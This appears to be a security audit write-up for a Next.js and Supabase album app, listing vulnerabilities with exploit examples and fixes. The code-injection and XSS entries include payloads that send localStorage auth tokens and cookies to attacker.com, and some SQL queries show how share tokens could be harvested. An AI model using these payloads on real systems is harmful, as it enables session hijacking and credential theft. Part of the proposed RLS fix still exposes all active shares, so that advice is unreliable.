# Security Documentation

## Overview

This document outlines security vulnerabilities discovered during code review, their severity, impact, and remediation steps. All issues are categorized by priority and include actionable fixes.

**Last Updated:** January 2025
**Review Grade:** C+ (60/100) - Critical issues require immediate attention

---

## 🚨 Critical Vulnerabilities (Fix Immediately)

### 1. Code Injection via Dynamic Function Execution

**Severity:** CRITICAL
**CWE:** CWE-94 (Code Injection)
**CVSS Score:** 9.8 (Critical)

**Location:** `src/lib/utils/web-worker.ts:61`

**Vulnerable Code:**
```typescript
const processor = new Function('return ' + data.fn)() as (item: T) => R
```

**Attack Vector:**
An attacker who can control the `data.fn` parameter can execute arbitrary JavaScript code in the web worker context.

**Impact:**
- Remote Code Execution (RCE)
- Data exfiltration
- Session hijacking
- Complete compromise of client-side security

**Exploit Example:**
```typescript
// Malicious payload
const maliciousFunction = `
  (function() {
    // Steal localStorage data
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        tokens: localStorage.getItem('supabase.auth.token'),
        userData: localStorage
      })
    });
    return (item) => item;
  })()
`;

// If this reaches the web-worker, code is executed
processArrayInWorker(data, maliciousFunction);
```

**Remediation:**

**Option A - Remove Dynamic Function Creation (Recommended):**
```typescript
// src/lib/utils/web-worker.ts
// Define allowed processor types
type ProcessorType = 'filter' | 'map' | 'reduce';

interface WorkerMessage<T, R> {
  processorType: ProcessorType;
  processorConfig: Record<string, unknown>;
  data: T[];
}

// Predefined safe processors
const PROCESSORS = {
  filter: (config: { predicate: string }) => {
    // Use safe, predefined predicates
    const predicates = {
      'isPositive': (n: number) => n > 0,
      'isEven': (n: number) => n % 2 === 0,
      // Add more as needed
    };
    return predicates[config.predicate as keyof typeof predicates];
  },
  map: (config: { transform: string }) => {
    const transforms = {
      'double': (n: number) => n * 2,
      'square': (n: number) => n * n,
    };
    return transforms[config.transform as keyof typeof transforms];
  },
};

// In worker
self.onmessage = (event: MessageEvent<WorkerMessage<T, R>>) => {
  const { processorType, processorConfig, data } = event.data;

  // Get predefined processor - NO dynamic code execution
  const processor = PROCESSORS[processorType](processorConfig);

  const result = data.map(processor);
  self.postMessage(result);
};
```

**Option B - Use Structured Data Only:**
```typescript
// Remove web worker entirely and use standard array operations
// Most processing is fast enough without workers
export function processArray<T, R>(
  data: T[],
  processorType: 'filter' | 'map',
  config: Record<string, unknown>
): R[] {
  // Direct, safe processing
  return data.map(/* predefined function */);
}
```

**Verification:**
```bash
# Ensure no occurrences of dangerous patterns
grep -r "new Function" src/
grep -r "eval(" src/
grep -r "Function(" src/
# Should return no results
```

---

### 2. Cross-Site Scripting (XSS) via innerHTML

**Severity:** CRITICAL
**CWE:** CWE-79 (XSS)
**CVSS Score:** 7.5 (High)

**Locations:**
1. `src/components/globe/EnhancedGlobe.tsx:1889-2051`
2. `src/components/map/PhotoMap.tsx`
3. `src/components/feed/MiniGlobe.tsx`

**Vulnerable Code:**
```typescript
// EnhancedGlobe.tsx - Lines 1889-2051
htmlElement={(d: object) => {
  const data = d as CityCluster;
  const el = document.createElement('div');

  // VULNERABLE: User data directly in innerHTML
  el.innerHTML = `
    <div class="globe-pin">
      <div class="pin-label">${data.label}</div>
      <div class="pin-stats">${data.albumCount} albums</div>
    </div>
  `;

  return el;
}}
```

**Attack Vector:**
If `data.label` contains malicious HTML/JavaScript, it will be executed.

**Exploit Example:**
```typescript
// Malicious album title in database
const maliciousAlbum = {
  title: '<img src=x onerror="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)">',
  location_name: 'Paris'
};

// When rendered on globe, cookie is stolen
```

**Impact:**
- Session hijacking
- Credential theft
- Phishing attacks
- Malware distribution

**Remediation:**

**Step 1 - Replace innerHTML with DOM APIs:**
```typescript
// src/components/globe/EnhancedGlobe.tsx
htmlElement={(d: object) => {
  const data = d as CityCluster;
  const el = document.createElement('div');
  el.className = 'globe-pin';

  // Safe: Use textContent instead of innerHTML
  const label = document.createElement('div');
  label.className = 'pin-label';
  label.textContent = data.label; // Auto-escapes HTML

  const stats = document.createElement('div');
  stats.className = 'pin-stats';
  stats.textContent = `${data.albumCount} albums`;

  el.appendChild(label);
  el.appendChild(stats);

  return el;
}}
```

**Step 2 - Add DOMPurify as Defense in Depth (if HTML needed):**
```bash
npm install isomorphic-dompurify
```

```typescript
import DOMPurify from 'isomorphic-dompurify';

// Only if you MUST support HTML (not recommended)
el.innerHTML = DOMPurify.sanitize(data.label, {
  ALLOWED_TAGS: [], // No tags allowed
  ALLOWED_ATTR: []  // No attributes allowed
});
```

**Step 3 - Input Validation at Database Layer:**
```typescript
// src/lib/validations/album.ts
import { z } from 'zod';

export const albumTitleSchema = z
  .string()
  .min(1, 'Title is required')
  .max(200, 'Title too long')
  .regex(/^[a-zA-Z0-9\s\-_.,!?']+$/, 'Title contains invalid characters')
  .transform(str => str.trim());

// Use in API routes
const validatedTitle = albumTitleSchema.parse(request.title);
```

**Verification:**
```bash
# Find all innerHTML usage
grep -rn "\.innerHTML\s*=" src/

# Find all dangerous patterns
grep -rn "dangerouslySetInnerHTML" src/
```

---

### 3. Broken Authentication - API Proxy Without Auth

**Severity:** CRITICAL
**CWE:** CWE-306 (Missing Authentication)
**CVSS Score:** 8.2 (High)

**Location:** `src/app/api/geocode/route.ts`

**Vulnerable Code:**
```typescript
export async function GET(request: NextRequest) {
  const { searchParams } = new URL(request.url);
  const query = searchParams.get('q');

  // NO AUTHENTICATION CHECK - anyone can use this endpoint!
  const nominatimUrl = `https://nominatim.openstreetmap.org/search?q=${query}`;

  const response = await fetch(nominatimUrl, {
    headers: {
      'User-Agent': 'Adventure Log App (contact@example.com)'
    }
  });

  return NextResponse.json(await response.json());
}
```

**Attack Vectors:**
1. **Free Geocoding Proxy:** Attackers can use your endpoint to make unlimited geocoding requests
2. **API Quota Exhaustion:** OpenStreetMap rate limits will ban your IP
3. **Resource Abuse:** Your Vercel function invocations will spike
4. **Data Harvesting:** Attackers can enumerate locations

**Impact:**
- Service disruption (IP banned by OpenStreetMap)
- Increased hosting costs
- Violation of OpenStreetMap Terms of Service
- Potential legal liability

**Remediation:**

**Step 1 - Add Authentication:**
```typescript
// src/app/api/geocode/route.ts
import { createClient } from '@/lib/supabase/server';
import { NextRequest, NextResponse } from 'next/server';

export async function GET(request: NextRequest) {
  // REQUIRED: Authenticate user
  const supabase = await createClient();
  const { data: { user }, error: authError } = await supabase.auth.getUser();

  if (authError || !user) {
    return NextResponse.json(
      { error: 'Unauthorized. Please log in to use geocoding.' },
      { status: 401 }
    );
  }

  const { searchParams } = new URL(request.url);
  const query = searchParams.get('q');

  if (!query || query.trim().length === 0) {
    return NextResponse.json(
      { error: 'Query parameter required' },
      { status: 400 }
    );
  }

  // Validate query length
  if (query.length > 200) {
    return NextResponse.json(
      { error: 'Query too long (max 200 characters)' },
      { status: 400 }
    );
  }

  // Sanitize query (prevent injection)
  const sanitizedQuery = encodeURIComponent(query.trim());

  const nominatimUrl = `https://nominatim.openstreetmap.org/search?q=${sanitizedQuery}&format=json&limit=5`;

  try {
    const response = await fetch(nominatimUrl, {
      headers: {
        'User-Agent': 'Adventure Log App (contact@example.com)'
      }
    });

    if (!response.ok) {
      throw new Error(`Geocoding failed: ${response.statusText}`);
    }

    const data = await response.json();

    return NextResponse.json(data, {
      headers: {
        'Cache-Control': 'public, max-age=3600' // Cache for 1 hour
      }
    });
  } catch (error) {
    console.error('Geocoding error:', error);
    return NextResponse.json(
      { error: 'Geocoding service unavailable' },
      { status: 503 }
    );
  }
}
```

**Step 2 - Add Rate Limiting:**
```typescript
// src/middleware/rate-limiting.ts (already exists, needs integration)
import { applyRateLimit } from '@/middleware/rate-limiting';

export async function GET(request: NextRequest) {
  // Apply per-user rate limit (10 requests per minute)
  const rateLimitResult = await applyRateLimit(request, {
    key: `geocode:${user.id}`,
    limit: 10,
    window: 60 // seconds
  });

  if (!rateLimitResult.success) {
    return NextResponse.json(
      { error: 'Rate limit exceeded. Try again later.' },
      {
        status: 429,
        headers: {
          'Retry-After': rateLimitResult.reset.toString()
        }
      }
    );
  }

  // ... rest of geocoding logic
}
```

**Step 3 - Remove CORS Wildcard:**
```typescript
// Current (WRONG):
headers: {
  'Access-Control-Allow-Origin': '*', // Anyone can call from any domain
}

// Correct (remove entirely - Next.js handles CORS):
// No CORS headers needed for same-origin requests
```

**Verification:**
```bash
# Test without auth (should fail)
curl http://localhost:3000/api/geocode?q=Paris

# Test with auth (should succeed)
curl -H "Authorization: Bearer YOUR_TOKEN" http://localhost:3000/api/geocode?q=Paris
```

---

### 4. Broken Access Control - Permissive RLS Policy

**Severity:** CRITICAL
**CWE:** CWE-284 (Improper Access Control)
**CVSS Score:** 9.1 (Critical)

**Location:** `supabase/migrations/20250111_add_album_sharing.sql:54-56`

**Vulnerable Code:**
```sql
CREATE POLICY "Users can view their album shares"
  ON album_shares FOR SELECT
  USING (
    auth.uid() = shared_by_user_id OR
    auth.uid() = shared_with_user_id OR
    true  -- 🚨 ANYONE CAN READ ANY SHARE!
  );
```

**Impact:**
- **Complete bypass of privacy controls**
- Any authenticated user can see all album shares
- Private album share tokens exposed
- Violation of user privacy expectations

**Exploit Example:**
```sql
-- Attacker can query all shares
SELECT * FROM album_shares WHERE is_active = true;

-- Get all share tokens
SELECT share_token, album_id FROM album_shares;

-- Access any shared album
SELECT * FROM albums WHERE id IN (
  SELECT album_id FROM album_shares WHERE share_token = 'stolen_token'
);
```

**Remediation:**

**Step 1 - Create Emergency Migration:**
```sql
-- supabase/migrations/20250112_fix_album_shares_rls_emergency.sql
-- EMERGENCY FIX: Remove permissive RLS policy

BEGIN;

-- Drop the broken policy
DROP POLICY IF EXISTS "Users can view their album shares" ON album_shares;

-- Create correct policy
CREATE POLICY "Users can view their album shares"
  ON album_shares FOR SELECT
  USING (
    -- User created the share
    auth.uid() = shared_by_user_id
    OR
    -- User received the share
    auth.uid() = shared_with_user_id
    OR
    -- Share is active and not expired (token-based access handled in app logic)
    (
      is_active = true
      AND (expires_at IS NULL OR expires_at > now())
      -- Token validation done in application layer
    )
  );

-- Add policy for token-based access (app will verify token before SELECT)
CREATE POLICY "Token-based share access"
  ON album_shares FOR SELECT
  USING (
    is_active = true
    AND (expires_at IS NULL OR expires_at > now())
    -- Application must verify share_token matches before this policy allows access
  );

COMMIT;
```

**Step 2 - Update Application Logic:**
```typescript
// src/app/(app)/albums/shared/[token]/page.tsx
import { createClient } from '@/lib/supabase/server';

export default async function SharedAlbumPage({
  params
}: {
  params: { token: string }
}) {
  const supabase = await createClient();

  // Verify share token BEFORE accessing album
  const { data: share, error: shareError } = await supabase
    .from('album_shares')
    .select('album_id, is_active, expires_at, permission_level')
    .eq('share_token', params.token)
    .single();

  if (shareError || !share) {
    return <div>Invalid share link</div>;
  }

  // Check expiration
  if (share.expires_at && new Date(share.expires_at) < new Date()) {
    return <div>This share link has expired</div>;
  }

  if (!share.is_active) {
    return <div>This share link has been deactivated</div>;
  }

  // NOW fetch album (RLS will allow because we verified token)
  const { data: album } = await supabase
    .from('albums')
    .select('*')
    .eq('id', share.album_id)
    .single();

  return <AlbumView album={album} permission={share.permission_level} />;
}
```

**Step 3 - Deploy Emergency Fix:**
```bash
# Run migration immediately in production
npx supabase db push

# Verify policies
npx supabase db inspect album_shares
```

**Verification:**
```sql
-- Test as different user
SET LOCAL role TO authenticated;
SET LOCAL request.jwt.claims.sub TO 'different-user-id';

-- Should NOT return shares for other users
SELECT * FROM album_shares;
```

---

### 5. Insecure Direct Object Reference (IDOR)

**Severity:** HIGH
**CWE:** CWE-639 (Insecure Direct Object Reference)
**CVSS Score:** 7.5 (High)

**Location:** `src/app/api/monitoring/errors/route.ts` (and all monitoring routes)

**Vulnerable Code:**
```typescript
// Using CLIENT Supabase in SERVER context
import { createClient } from '@/lib/supabase/client'; // WRONG

export async function POST(request: NextRequest) {
  const supabase = createClient(); // No await, wrong client type

  // This might not have proper session context
  const { error } = await supabase
    .from('error_logs')
    .insert(errorData);
}
```

**Impact:**
- Authentication bypass
- Errors logged without user attribution
- Potential data leakage
- Session management issues

**Remediation:**

**Fix All Monitoring Routes:**
```typescript
// src/app/api/monitoring/errors/route.ts
import { createClient } from '@/lib/supabase/server'; // CORRECT
import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  const supabase = await createClient(); // CORRECT: await server client

  // Verify authentication
  const { data: { user }, error: authError } = await supabase.auth.getUser();

  if (authError || !user) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  const body = await request.json();

  // Insert with user context
  const { error } = await supabase
    .from('error_logs')
    .insert({
      ...body,
      user_id: user.id, // Properly attributed
      timestamp: new Date().toISOString()
    });

  if (error) {
    console.error('Failed to log error:', error);
    return NextResponse.json({ error: 'Logging failed' }, { status: 500 });
  }

  return NextResponse.json({ success: true });
}
```

**Files to Fix:**
1. `src/app/api/monitoring/errors/route.ts`
2. `src/app/api/monitoring/performance/route.ts`
3. `src/app/api/monitoring/security/route.ts`
4. `src/app/api/monitoring/web-vitals/route.ts`

**Verification:**
```bash
# Search for incorrect pattern
grep -rn "from '@/lib/supabase/client'" src/app/api/

# Should return NO results from API routes
```

---

## ⚠️ High Priority Issues

### 6. Missing Input Validation

**Severity:** HIGH
**CWE:** CWE-20 (Improper Input Validation)

**Locations:** All API routes lack comprehensive validation

**Example - Cover Position API:**
```typescript
// src/app/api/albums/[id]/cover-position/route.ts
const { position, xOffset, yOffset } = body;

// Only checks undefined, not type/range
if (!position || xOffset === undefined || yOffset === undefined) {
  return NextResponse.json({ error: 'Missing fields' }, { status: 400 });
}
```

**Remediation:**
```typescript
import { z } from 'zod';

const coverPositionSchema = z.object({
  position: z.enum(['top', 'center', 'bottom', 'left', 'right', 'custom']),
  xOffset: z.number().min(-100).max(100),
  yOffset: z.number().min(-100).max(100)
});

export async function PATCH(request: NextRequest) {
  try {
    const body = await request.json();
    const validated = coverPositionSchema.parse(body);
    // Now use validated data
  } catch (error) {
    if (error instanceof z.ZodError) {
      return NextResponse.json({ errors: error.errors }, { status: 400 });
    }
    throw error;
  }
}
```

---

### 7. Race Conditions in Profile Caching

**Severity:** MEDIUM
**CWE:** CWE-362 (Race Condition)

**Location:** `src/components/auth/AuthProvider.tsx:166-261`

**Issue:** Multiple simultaneous calls to `fetchProfile` trigger duplicate queries.

**Fix:** See full implementation in main review document (request deduplication pattern).

---

### 8. Memory Leaks in useEffect

**Severity:** MEDIUM
**CWE:** CWE-404 (Improper Resource Shutdown)

**Location:** Multiple components with useEffect

**Fix:** Add AbortController pattern (detailed in main review).

---

## Security Checklist

Before deploying to production:

- [ ] **Remove dynamic code execution** (web-worker.ts)
- [ ] **Fix XSS vulnerabilities** (EnhancedGlobe, PhotoMap, MiniGlobe)
- [ ] **Add authentication to geocoding API**
- [ ] **Fix RLS policy** (album_shares)
- [ ] **Fix Supabase client imports** (all monitoring routes)
- [ ] **Add input validation** (all API routes with Zod)
- [ ] **Implement rate limiting** (integrate existing middleware)
- [ ] **Remove CORS wildcards**
- [ ] **Add Content Security Policy headers**
- [ ] **Enable Supabase RLS on all tables** (verify)
- [ ] **Audit all innerHTML usage**
- [ ] **Set up Sentry for error tracking**
- [ ] **Configure security headers** (already exists, verify)
- [ ] **Add API request logging**
- [ ] **Test authentication flows**

---

## Reporting Security Issues

If you discover a security vulnerability, please email security@adventurelog.com with:

1. Description of the vulnerability
2. Steps to reproduce
3. Potential impact
4. Suggested fix (if available)

**Do not** create public GitHub issues for security vulnerabilities.

---

## Security Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Supabase Security Best Practices](https://supabase.com/docs/guides/auth/row-level-security)
- [Next.js Security Headers](https://nextjs.org/docs/advanced-features/security-headers)
- [Content Security Policy Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
